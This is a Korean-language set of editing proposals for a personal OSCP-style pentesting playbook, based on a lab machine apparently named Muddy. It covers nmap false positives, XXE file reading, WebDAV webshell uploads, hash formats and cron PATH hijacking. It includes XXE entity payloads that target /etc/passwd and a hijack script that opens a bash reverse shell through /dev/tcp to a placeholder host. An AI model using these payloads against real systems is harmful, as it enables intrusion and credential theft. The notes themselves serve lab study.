## A. 증상별 — 신규/병합 제안

### 제안 A-1 (신규): `--min-rate` 를 높이면 유령 포트가 생긴다

**어느 절**: A 절 신규(기존 A-11 "자동 도구가 뱉은 값이 의심스럽다"·A-17 "부가 포트가 기본 페이지·403만 뱉는다"와 인접하나 "포트 자체가 오탐"이라는 케이스는 없음 — 병합보다 신규 권장)

**넣을 본문**:

`--min-rate 5000` 스캔이 실제 서비스 5개(22·25·80·111·8888) 외에 443·808·908 을 열림으로 보고함. OS 판정도 같이 흔들려 "MikroTik RouterOS 7.X" 로 오판(신뢰 낮은 배지). 세 포트 모두 `curl` 에 빈 응답.

```bash
curl http://192.168.248.161:443/     → 빈 응답
curl http://192.168.248.161:808/     → 빈 응답
curl http://192.168.248.161:908/     → 빈 응답
```

같은 시각대 병행 재확인(`nmap -Pn -sS -p- --min-rate 3000 -T4`, `-A` 없음)에서는 이 셋이 사라짐 — 두 스캔이 겹치는 포트만 실제 서비스로 확정.

```text
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
111/tcp  open  rpcbind
8888/tcp open  sun-answerbook
```
— 출처: `~/PG/Muddy/nmap_full.txt`

판별 기준(원문):
> RST가 온다 = 닫힘. 스캔이 틀렸다 / 아무것도 안 온다(타임아웃) = 필터링, 방화벽 / 연결은 되는데 데이터가 없다 = 진짜로 서비스가 있고 클라이언트가 먼저 말해야 하는 프로토콜(banner 없는 서비스). `nc -vz <IP> <port>` 나 `nmap -sT -p <port> --reason` 으로 연결 자체가 되는지 5초 안에 판정할 수 있다. `--reason` 플래그는 nmap이 왜 그렇게 판정했는지(`syn-ack`/`reset`/`no-response`)를 알려주므로 오탐 추적에 가장 유용하다.

**원문(삭제 전 인용)**: 옛 노트 §6-① 전문, §1 "포트 재판정" 절 전문(위와 동일 내용의 원출처).

### 제안 A-2 (신규): 유명 CMS 가 봉쇄돼 있고 정체불명 서비스가 함께 뜨면 정체불명 쪽이 정답이다

**어느 절**: A 절 신규

**넣을 본문**:

WordPress 5.7 + 구형 플러그인(kali-forms 2.3.0)이 시각적으로 유혹적이나, `wp-login.php` 가 302 로 `/404` 리다이렉트되고 `wp-json` 도 401 — 인증 표면 자체가 없어 인증 후 취약점을 찾아내도 못 씀.

판정 순서(원문): ① 인증 없이 닿는 엔드포인트가 있는가 → ② 그 엔드포인트가 입력을 받는가 → ③ 그 입력이 위험한 싱크에 닿는가. ①에서 막히면 버전이 아무리 낮아도 넘어간다. `curl -I http://target/wp-login.php` 한 줄로 ①을 먼저 판정할 것.

일반 규칙(원문): 랩 설계자가 유명 CMS를 진짜 진입점으로 뒀다면 정상 로그인 폼을 열어뒀을 것이다. 8888 같은 정체불명 프레임워크가 함께 떠 있다는 것 자체가 의도의 표시.

**원문(삭제 전 인용)**: 옛 노트 §6-② 전문(제목 "WordPress 5.7에 시간을 태울 뻔했다"), §1 "80/tcp — WordPress 5.7은 미끼다" 콜아웃 전문.

### 제안 A-3 (신규): 「LFI」로 잘못 분류된 노트를 믿고 없는 파라미터를 찾았다 — 입력 형식부터 재확인

**어느 절**: A 절 신규(B-11 SSTI 카드의 "취약점 부류는 입력 형식으로 좁혀진다"류 사고와 인접하나 "기존 분류를 못 믿는" 케이스로는 신규)

**넣을 본문**:

기존 노트가 이 박스를 **LFI** 로 분류했으나 랩 브리핑은 **XXE**. `?page=`·`?file=`·`?include=` 같은 파라미터가 80/8888 어디에도 없어 계속 찾는 것이 가장 나쁜 시간 소모였음. 전환점은 "입력이 어떤 형식으로 들어가는가" 재검토 — `uid` 는 쿼리스트링이 아니라 SOAP XML 바디로 전달됨.

자가 판정 절차(원문):
1. 사용자 입력이 서버에 도달하는 모든 경로를 나열 — 쿼리스트링·폼 바디·헤더·쿠키·XML/JSON 바디·업로드 파일명·업로드 파일 내용
2. 각 입력이 어떤 형식으로 파싱되는가 확인 — 문자열? XML? JSON? YAML? 직렬화 객체?
3. 형식이 정해지면 후보 자동 축소:
   - 문자열 → LFI·SQLi·커맨드 인젝션·SSTI
   - XML → XXE·XPath 인젝션·XML 폭탄
   - JSON → 프로토타입 오염·타입 혼동
   - YAML → 역직렬화 RCE
   - 직렬화 객체 → 역직렬화 RCE

"파라미터가 없다"는 막다른 길이 아니라 "입력 형식이 다르다"는 신호.

**원문(삭제 전 인용)**: 옛 노트 §2-8("XXE인가 LFI인가 — 실제로 확인했다") 전문, §6-③ 전문.

### 제안 A-4 (신규): 같은 익스플로잇에서 일부 입력만 실패하면 실패한 입력의 특성을 봐라 (XXE `<` 문자 한계)

**어느 절**: A 절 신규

**넣을 본문**:

`apache2.conf`(`AuthUserFile` 확인 목적)를 XXE 로 읽으려 했으나 이 traceback 이 돌아옴:
```text
UnboundLocalError: local variable 'req_dict' referenced before assignment
```
`/etc/passwd` 는 잘 읽혔는데 이 파일만 실패해 "방금 그건 우연이었나" 하고 의심하게 됨. 실제로는 파일에 `<` 가 있어 재파싱이 문법을 깨는 파싱 붕괴이고, **취약함의 방증**임(XXE 자체가 안 통했다면 애초에 이 traceback도 안 남).

확인법(원문): 실패한 파일을 `head -1` 만 읽어보거나, 확실히 `<` 가 없는 다른 파일(`/etc/hostname`)을 하나 더 읽어 익스플로잇이 살아 있음을 재확인. 30초면 판정됨.

읽힌다/안 읽힌다 분류표(원문):
| 읽힌다 | 안 읽힌다 |
|---|---|
| `/etc/passwd` · `/etc/shadow` · `/etc/hosts` | `*.conf` (Apache/nginx — `<Directory>` 등) |
| `.htpasswd` · `passwd.dav` | `*.php` (`<?php`) |
| `/etc/crontab` · `/proc/self/environ` | `*.xml` · `*.html` |
| SSH 개인키(`-----BEGIN`) | 부등호가 든 스크립트(`if [ $a < $b ]`) |

우회책 둘(원문, XXE 기법 카드와 겹치므로 신규 XXE 카드 쪽에 넣어도 됨 — 판단은 반영자 몫):
1. OOB DTD — 파라미터 엔티티(`%`)로 공격자 서버 DTD 를 불러 파일 내용을 URL 에 실어 보냄
2. `php://filter` base64 래핑 — PHP 애플리케이션 한정, Ladon(Python)엔 못 씀

과잉 대응 금지 판단(원문): 목표 파일이 평문이면(`<` 없음) 인밴드로 충분 — OOB DTD 세팅에 최소 10분(웹서버 기동·DTD 작성·아웃바운드 확인)이 드니 "고급 기법을 안다"와 "지금 필요하다"는 다름. 판단 순서: ① 목표 파일 확정 → ② `<` 있을 법한가 판단 → ③ 없으면 인밴드.

**원문(삭제 전 인용)**: 옛 노트 §2-7 전문, §6-④ 전문.

### 제안 A-5 (신규): 웹셸은 올렸는데(201) 실행이 401 — 업로드 실패로 오인하기 쉽다

**어느 절**: A 절 신규(A-24 "한 서비스의 거부는 자격증명의 오류가 아니다"와 인접하나 그쪽은 다른 서비스 간 자격증명 재사용 실패 케이스라 별개)

**넣을 본문**:

`curl -T` 로 `201 Created` 를 받고 브라우저로 `http://.../webdav/sh.php?c=id` 를 열면 401. `201` 을 받았으니 파일은 분명 있는데 401 이 나오면 "업로드가 실제로는 실패했나"·"확장자가 막혔나"·"WebDAV 가 PUT 을 흉내만 냈나" 같은 잘못된 가설로 빠지기 쉬움.

원인: `/webdav/` 는 `GET` 에도 Basic auth 를 요구함. `--user` 를 붙이면 즉시 `uid=33(www-data)`.

일반화(원문): 인증 영역 안에 파일을 올렸으면 그 파일도 인증 영역 안. 업로드(`201 Created`)와 실행은 별개 요청이라 둘 다 인증을 붙일 것.

401/403/404/500 판별표(원문):
| 코드 | 의미 | 다음 행동 |
|---|---|---|
| 401 | 인증이 필요하다 | 자격증명을 붙인다. 파일 존재 여부와 무관 |
| 403 | 인증됐거나 인증 불필요인데 정책이 막는다 | 다른 경로·다른 메서드. `.ht*` 차단 같은 정적 규칙 의심 |
| 404 | 없다 | 경로 추측을 다시 |
| 500 | 코드가 실행되다 죽었다 | 가장 값진 응답. 입력이 싱크에 도달했다는 뜻 |

이 박스는 401·403·500 을 전부 만나고 셋 다 다른 의미로 씀 — 500(traceback)은 버전 판정, 403(`.htpasswd`)은 "HTTP 로는 못 얻는다"의 확정, 401 은 "인증 붙여라".

**원문(삭제 전 인용)**: 옛 노트 §3-3 경고 콜아웃 전문("업로드한 웹셸을 호출할 때도 인증이 필요하다"), §6-⑤ 전문.

### 제안 A-6 (신규): 헤드리스 캡처는 오류 페이지도 성공으로 저장한다 — 반드시 열어서 확인

**어느 절**: A 절 신규(C-4 스크린샷 카드와 인접 — C-4 에 짧게 추가하는 것도 가능. 판단은 반영자 몫)

**넣을 본문**:

정찰 단계 헤드리스 Chrome 캡처 스크린샷 4장이 전부 `ERR_ADDRESS_UNREACHABLE` 오류 페이지였음. 파일 크기(수십 KB)·색상 수는 정상 캡처와 구분 안 됨. 실제로 열어보고서야 걸러냄.

위험 이유(원문): 헤드리스 브라우저는 연결 실패해도 오류 페이지를 정상 렌더링해 PNG 를 만들고 종료 코드 0 을 반환 — 자동화 파이프라인에서는 성공으로 보임. "캡처가 됐으니 서비스가 살아 있다"는 잘못된 확정 사실이 노트에 박히고 뒤의 판단이 그 위에 쌓임.

검증 절차(원문):
```bash
file x.png && identify -format '%wx%h %k colors\n' x.png
```
가장 확실한 것은 그냥 여는 것. OSCP 시험에서 스크린샷은 증거이므로 오류 페이지를 증거로 제출하면 그 플래그는 인정 안 됨.

**원문(삭제 전 인용)**: 옛 노트 §6-⑥ 전문.

## B. 기법 카드 — 신규/병합 제안

### 제안 B-XXE (신규): XXE(XML External Entity) — DTD·엔티티 배경과 판단 절차

**어느 절**: B 절 신규(현재 `_PLAYBOOK` 에 XXE 카드 없음 — B-11 SSTI·B-16 XPath 와 같은 계열의 "입력 형식별 취약점 카드")

**넣을 본문**:

**엔티티(entity)** 는 XML 매크로. 파서가 정의된 이름을 만나면 값으로 치환:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY company "ACME Corp"> ]>
<doc>&company;</doc>
```
`SYSTEM` 키워드를 붙이면 외부에서 값을 가져옴:
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```
이게 **외부 일반 엔티티**이고, 이를 악용하는 것이 XXE. XML 1.0 명세의 정상 기능(문서 간 공용 DTD 참조용)이라 파서 버그가 아님 — 공격자가 XML 문서 전체(DTD 선언부 포함)를 제어할 수 있는 환경에서 살아 있는 게 문제. 진입점은 언제나 "서버가 사용자가 보낸 XML 을 파싱하는 곳" — SOAP·XML-RPC·SAML 응답·DOCX/XLSX/SVG 업로드·XML 설정 임포트·RSS 취합.

`SYSTEM` URI 스킴별 파생 공격:
| URI | 결과 |
|---|---|
| `file:///etc/passwd` | 로컬 파일 읽기 |
| `http://내서버/x` | SSRF — 내부망 스캔·메타데이터 서비스 접근 |
| `php://filter/convert.base64-encode/resource=...` | PHP 한정. 내용을 base64 로 감싸 파싱 붕괴 회피 |
| `expect://id` | PHP `expect` 확장이 있으면 RCE(드묾) |

언어별 안전하지 않은 기본값(원문):
- Python 2.7 `xml.sax`/`minidom`(expat 백엔드) — `feature_external_ges` 기본 True, 즉 기본 취약. `defusedxml` 로 교체가 권장 해법
  ```python
  from xml.sax.handler import feature_external_ges
  parser = make_parser()
  parser.setFeature(feature_external_ges, False)   # 이 한 줄이 XXE를 죽인다
  ```
- Java `DocumentBuilderFactory` — 기본 취약. `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` 필요
- PHP `libxml` < 2.9 — 기본 취약. 2.9부터 기본 비활성
- .NET `XmlDocument` 구버전 — `XmlResolver = null` 필요

"안전하지 않은 기본값"은 "구버전이라 취약"과 다른 결함 클래스 — 개발자가 실수한 게 아니라 아무것도 안 한 것이 취약점이 됨. **XML 을 받는 엔드포인트를 만나면 일단 XXE 를 시도할 것.**

**출처**: [[Muddy]] — Ladon SOAP `checkout(uid)`, `xml.sax.make_parser()` 하드닝 부재.

**원문(삭제 전 인용)**: 옛 노트 §2-1 "배경 지식 — DTD와 엔티티가 무엇인가" 전문, §2-2 "`SYSTEM`이 붙는 순간 파일 읽기가 된다" 전문, §2-3 "파서 하드닝이 무엇을 막는가" 전문(danger 콜아웃 "Python 2.7의 기본값은 '활성'이다" 포함). 원문 전량은 `03. PG\_backup\Muddy.md.bak` 88–260행에 보존됨.

⚠️ 감사 시 Kali 의 `python2` 로 직접 확인함 — `xml.sax.make_parser().getFeature(feature_external_ges)` 가 `1` 이고, `file:///etc/hostname` 엔티티가 실제로 확장됨. 「Python 2.7 기본 취약」은 **실측 확인된 단정**임.

### 제안 B-HASH (신규 — 또는 B-63 sha512crypt 카드에 병합, 반영자 판단): 해시 접두어로 포맷을 즉시 판별한다

**어느 절**: B 절 신규 또는 기존 B-63 확장

**넣을 본문**:

`$` 로 시작하는 해시는 `$id$salt$hash` 구조, `id` 자리가 알고리즘:

| 접두어 | 알고리즘 | john `--format` | hashcat `-m` |
|---|---|---|---|
| `$apr1$` | Apache MD5(APR1) | `md5crypt`(또는 `md5crypt-long`) | `1600` |
| `$1$` | md5crypt(전통 Unix) | `md5crypt` | `500` |
| `$5$` | SHA-256 crypt | `sha256crypt` | `7400` |
| `$6$` | SHA-512 crypt | `sha512crypt` | `1800` |
| `$2a$`/`$2b$`/`$2y$` | bcrypt | `bcrypt` | `3200` |
| `$y$` | yescrypt(최신 Debian/Ubuntu `/etc/shadow`) | — | — |
| 접두어 없는 32 hex | 원시 MD5 | `raw-md5` | `0` |

`--format` 을 안 주면 john 이 오판해서 영영 안 깨짐. `$apr1$` 은 특히 `md5crypt` 로 잡아야 하는데 자동 감지가 다른 후보를 먼저 고르는 경우가 있음. 헷갈리면 `john --list=formats | tr ',' '\n' | grep -i md5`.

`$y$`(yescrypt) 는 john/hashcat 표준 빌드로 잘 안 깨짐 — 시험에서 봤으면 크랙에 시간 쓰지 말고 다른 경로.

**출처**: [[Muddy]] — `passwd.dav` 의 `$apr1$` → `administrant:sleepless`(rockyou, 1초).

**원문(삭제 전 인용)**: 옛 노트 §3-2 tip 콜아웃 "해시 접두어로 포맷을 즉시 판별한다" 전문 + 이어지는 warning 콜아웃 "`$y$` (yescrypt)는 john/hashcat 표준 빌드로 잘 안 깨진다" 전문. `03. PG\_backup\Muddy.md.bak` 445–465행.

### 제안 B-31 확장 (기존 절 병합): 크론 PATH 하이재킹 — 탐색 원리와 하이재킹 바이너리 체크리스트

**어느 절**: 기존 `B-31. 크론 기반 권한상승`(이미 [[Muddy]] 를 출처로 인용 중 — 현재는 "쓰기 가능한 스크립트" 탐지법만 있고 **PATH 순서 하이재킹의 메커니즘**이 없음)

**넣을 본문**(append):

**PATH 순서 하이재킹** — 크론 `PATH=` 줄을 왼쪽부터 읽는다. 셸이 절대경로 아닌 이름(`netstat` 등)을 만나면 PATH 를 순서대로 순회해 **첫 번째로 발견한 것을 실행하고 탐색을 멈춘다.** 결함의 본체는 "절대경로 미사용"이 아니라 **쓰기 가능한 디렉터리가 PATH 앞쪽에 있는 것** — `PATH=/sbin:/bin:/usr/sbin:/usr/bin` 처럼 root 전용 디렉터리로만 구성되면 절대경로 미사용은 무해함.

판정 순서: ① `PATH=` 줄을 읽는다 → ② 각 디렉터리에 `ls -ld` 로 쓰기 권한 확인 → ③ 쓰기 가능한 것이 진짜 경로보다 앞에 있으면 성립.
```bash
echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null
find / -writable -type d 2>/dev/null | head -50
```
단골: `/dev/shm`·`/tmp`·`/var/tmp`·`/var/www`·홈 디렉터리·`/opt/scripts` 류. `/dev/shm` 은 `noexec` 안 걸린 경우가 많아 실행 파일 배치 가능 — `mount | grep shm` 으로 확인(`noexec` 있으면 이 공격 실패).

**하이재킹 바이너리는 원래 동작을 보존할 것** — 크론이 `&&` 체인이면 가짜 바이너리가 0 아닌 종료 코드를 반환할 때 뒤가 안 돌아 관리자가 결과물(예: `/root/status`)로 눈치챔.
```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' &
exec /usr/bin/netstat "$@"
```
| 조각 | 역할 |
|---|---|
| `#!/bin/bash` | 셔뱅 필수. 없으면 `sh` 가 텍스트 파일 실행 실패하거나 `bash` 전용 문법(`>&`)이 안 먹음 |
| `bash -c '...' &` | 리버스셸을 백그라운드로. 없으면 크론이 셸 종료를 기다려 다음 주기까지 산출물이 안 갱신돼 탐지됨 |
| `exec` | 현재 프로세스를 진짜 바이너리로 교체 — 새 프로세스 fork 안 해서 PID·종료 코드가 그대로 호출자에게 전달 |
| `/usr/bin/netstat`(절대경로) | 상대경로 쓰면 자기 자신을 다시 부르는 무한 재귀(PATH 맨 앞이 자기 위치이므로) |
| `"$@"` | 원래 인자를 그대로 전달. 큰따옴표 없으면 공백 든 인자가 쪼개짐 |

무반응 시 순서대로 의심(원문): ① `chmod +x` 누락(가장 흔함 — 실행 비트 없으면 PATH 탐색이 후보로 안 침, 진짜 바이너리가 정상 실행돼 에러도 안 남) ② 셔뱅 누락 ③ `noexec` 마운트 ④ 아웃바운드 포트 차단. 리버스셸 대신 `id > /dev/shm/marker` 로 먼저 검증하면 ①~③과 ④를 분리 가능.

대기 중 다른 열거 병행 — `find -perm -4000`·`getcap`·`/etc/passwd` 사용자 목록·`netstat -tlpn` 내부 전용 포트 확인.

**출처**: [[Muddy]] — `/etc/crontab` `PATH=/dev/shm:...`, `/dev/shm/netstat` 하이재킹, 60초 대기 후 root.

**원문(삭제 전 인용)**: 옛 노트 §4-3 "왜 이것이 권한상승이 되는가 — PATH 탐색의 원리" 전문(PATH 7단계 펼침 목록·danger 콜아웃 "결함의 본체는 '절대경로를 안 썼다'가 아니다"·tip 콜아웃 "쓰기 가능 디렉터리 단골 후보"), §4-4 danger 콜아웃 "원래 동작을 반드시 유지하라 — `exec /usr/bin/netstat \"$@\"`" 전문(조각 역할 표 포함), §4-4 warning 콜아웃 "`chmod +x`를 잊으면 조용히 실패한다" 전문, §4-5 tip 콜아웃 "크론 대기 시간을 낭비하지 마라" 전문. `03. PG\_backup\Muddy.md.bak` 588–660행.

⚠️ 이 절의 원문 자체가 **근거부족**임 — `/etc/crontab` 내용·`/dev/shm/netstat` 스크립트는 개작 전 노트에서 이관된 것이고 `~/PG/Muddy/` 에 뒷받침 산출물이 없음. `_PLAYBOOK` 에 반영할 때 **기법 설명은 일반 지식으로 살리되 「Muddy 에서 실측했다」는 형태로 쓰지 말 것.**

### 제안 C-2 (신규): traceback 을 버전 지문으로 쓴다 — 그리고 행동을 안 바꾸는 정밀도는 추구하지 않는다

**어느 절**: B 절 신규(기법 카드). 옛 노트가 "이 박스에서 가장 재사용 가치가 높은 기법"으로 지목한 것인데 초안 9건에 없었음

**넣을 본문**:

배너(`Server:` 헤더)는 위조·생략이 쉬움. 반면 traceback·스택 트레이스·디버그 페이지는 **실제 실행 중인 코드에서 나오므로** 위조가 사실상 없음. Python traceback 은 **파일 경로 + 행 번호 + 그 행의 소스 텍스트**를 함께 주므로 사실상 버전 지문임.

절차: ① 존재하지 않는 파라미터·잘못된 타입·빈 값으로 일부러 500 을 유도 → ② 노출된 파일 경로·행 번호·소스 텍스트 기록 → ③ PyPI/npm/Maven 에서 후보 버전 소스를 받아 같은 행을 대조. Python `traceback`, Java 스택 트레이스, Rails `.rb:행번호`, PHP `Fatal error ... on line N` 전부 같은 방식.

**멈추는 기준이 절반이다.** 세부 버전이 필요한 경우는 둘뿐 — ① 특정 패치 버전에서만 통하는 공개 익스플로잇을 쓸 때 ② 보고서에 CVE 를 매핑해야 할 때. 둘 다 아니면 좁히기를 멈춤. 그리고 **못 좁힌 사실은 「미확정」으로 남길 것** — 나중에 확정값으로 잘못 기억하는 것보다 나음.

**원문(삭제 전 인용)**: 옛 노트 §1 tip 콜아웃 "일반화 — 에러 페이지는 버전 판정의 1급 근거다" 전문, §6-⑦ "버전을 0.9.30–0.9.40까지밖에 못 좁혔다" 전문(선택지 (A)/(B) 서술 + tip 콜아웃 "버전 특정은 그것이 행동을 바꿀 때만 가치가 있다"), §7-6 전문. `03. PG\_backup\Muddy.md.bak` 의 §1 "Ladon 버전 판정" 절 및 §6-⑦.
